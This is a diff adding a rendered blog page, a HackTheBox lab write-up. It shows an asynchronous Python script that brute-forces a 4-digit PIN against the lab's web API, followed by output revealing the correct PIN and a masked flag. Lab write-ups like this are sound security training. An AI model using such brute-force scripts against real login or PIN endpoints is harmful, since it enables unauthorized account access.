@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  HTB - Login Brute Forcing Module - Brute Force Attacks · GeekyRyan
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Ryan Nemeth">
+<meta name="description" content="
+  HackTheBox Login Brute Force - Brute Force Attacks
+  
+    
+    Link to heading
+  
+
+This is part of a multi-part series documenting my process for completing the HackTheBox modules. This first post covers capturing a flag from a web API by brute-forcing a 4-digit PIN.
+This is a simple challenge (not even really a challenge, tbh), but it&rsquo;s a good warm-up for more complex brute-force tasks later on.">
+<meta name="keywords" content="blog,developer,personal,devops">
+
+
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="HTB - Login Brute Forcing Module - Brute Force Attacks">
+  <meta name="twitter:description" content="HackTheBox Login Brute Force - Brute Force Attacks Link to heading This is part of a multi-part series documenting my process for completing the HackTheBox modules. This first post covers capturing a flag from a web API by brute-forcing a 4-digit PIN.
+This is a simple challenge (not even really a challenge, tbh), but it’s a good warm-up for more complex brute-force tasks later on.">
+
+<meta property="og:url" content="http://localhost:1313/htb/2025-12-11-htb-brute-force-00/">
+  <meta property="og:site_name" content="GeekyRyan">
+  <meta property="og:title" content="HTB - Login Brute Forcing Module - Brute Force Attacks">
+  <meta property="og:description" content="HackTheBox Login Brute Force - Brute Force Attacks Link to heading This is part of a multi-part series documenting my process for completing the HackTheBox modules. This first post covers capturing a flag from a web API by brute-forcing a 4-digit PIN.
+This is a simple challenge (not even really a challenge, tbh), but it’s a good warm-up for more complex brute-force tasks later on.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="htb">
+    <meta property="article:published_time" content="2025-12-11T16:01:00+00:00">
+    <meta property="article:modified_time" content="2025-12-11T16:01:00+00:00">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/htb/2025-12-11-htb-brute-force-00/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      GeekyRyan
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/about/">About</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/til/">TIL</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/projects/">Projects</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/notes/">Notes</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/htb/">HTB</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="http://localhost:1313/htb/2025-12-11-htb-brute-force-00/">
+          HTB - Login Brute Forcing Module - Brute Force Attacks
+        </a>
+      </h1>
+    </header>
+
+    <h1 id="hackthebox-login-brute-force---brute-force-attacks">
+  HackTheBox Login Brute Force - Brute Force Attacks
+  <a class="heading-link" href="#hackthebox-login-brute-force---brute-force-attacks">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>This is part of a multi-part series documenting my process for completing the HackTheBox modules. This first post covers capturing a flag from a web API by brute-forcing a 4-digit PIN.</p>
+<p>This is a simple challenge (not even really a challenge, tbh), but it&rsquo;s a good warm-up for more complex brute-force tasks later on.</p>
+<h2 id="overview">
+  Overview
+  <a class="heading-link" href="#overview">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>HTB provides a public API and python script for this lesson. The script essentially just tries to authenticate to the API using a simple API key. The provided script is extremely slow and runs synchronously, so I rewrote it to be asynchronous using <code>aiohttp</code> to speed up the process.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">asyncio</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">aiohttp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">IP</span> <span class="o">=</span> <span class="s2">&#34;94.237.120.74&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">PORT</span> <span class="o">=</span> <span class="mi">58014</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">try_pin</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">pin</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">formatted_pin</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">pin</span><span class="si">:</span><span class="s2">04d</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;http://</span><span class="si">{</span><span class="n">IP</span><span class="si">}</span><span class="s2">:</span><span class="si">{</span><span class="n">PORT</span><span class="si">}</span><span class="s2">/pin?pin=</span><span class="si">{</span><span class="n">formatted_pin</span><span class="si">}</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">async</span> <span class="k">with</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> <span class="k">as</span> <span class="n">resp</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="k">await</span> <span class="n">resp</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;flag&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">formatted_pin</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="s2">&#34;flag&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Attempted PIN </span><span class="si">{</span><span class="n">formatted_pin</span><span class="si">}</span><span class="s2">, received status </span><span class="si">{</span><span class="n">resp</span><span class="o">.</span><span class="n">status</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">async</span> <span class="k">with</span> <span class="n">aiohttp</span><span class="o">.</span><span class="n">ClientSession</span><span class="p">()</span> <span class="k">as</span> <span class="n">session</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">tasks</span> <span class="o">=</span> <span class="p">[</span><span class="n">try_pin</span><span class="p">(</span><span class="n">session</span><span class="p">,</span> <span class="n">pin</span><span class="p">)</span> <span class="k">for</span> <span class="n">pin</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10000</span><span class="p">)]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">coro</span> <span class="ow">in</span> <span class="n">asyncio</span><span class="o">.</span><span class="n">as_completed</span><span class="p">(</span><span class="n">tasks</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">res</span> <span class="o">=</span> <span class="k">await</span> <span class="n">coro</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">res</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">pin</span><span class="p">,</span> <span class="n">flag</span> <span class="o">=</span> <span class="n">res</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Correct PIN:&#34;</span><span class="p">,</span> <span class="n">pin</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Flag:&#34;</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">asyncio</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
+</span></span></code></pre></div><p>Simple.</p>
+<p>I setup a python environment using <code>uv</code> and installed libraries. This is really my only deviation from the provided instructions.</p>
+<p>Run the script, and wait a few seconds.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">....
+</span></span><span class="line"><span class="cl">Attempted PIN 2804, received status <span class="m">401</span>
+</span></span><span class="line"><span class="cl">Attempted PIN 1363, received status <span class="m">401</span>
+</span></span><span class="line"><span class="cl">Attempted PIN 2803, received status <span class="m">401</span>
+</span></span><span class="line"><span class="cl">Attempted PIN 8323, received status <span class="m">401</span>
+</span></span><span class="line"><span class="cl">Attempted PIN 8324, received status <span class="m">401</span>
+</span></span><span class="line"><span class="cl">Attempted PIN 4544, received status <span class="m">401</span>
+</span></span><span class="line"><span class="cl">Attempted PIN 2805, received status <span class="m">401</span>
+</span></span><span class="line"><span class="cl">Correct PIN: <span class="m">1364</span>
+</span></span><span class="line"><span class="cl">Flag: HTB<span class="o">{</span>Bru******************<span class="o">}</span>
+</span></span></code></pre></div><p>Paste the flag in the text box on HTB and complete the challenge!</p>
+
+  </article>
+</section>
+
+  
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2012 -
+    
+    2026
+     Ryan Nemeth 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.js"></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
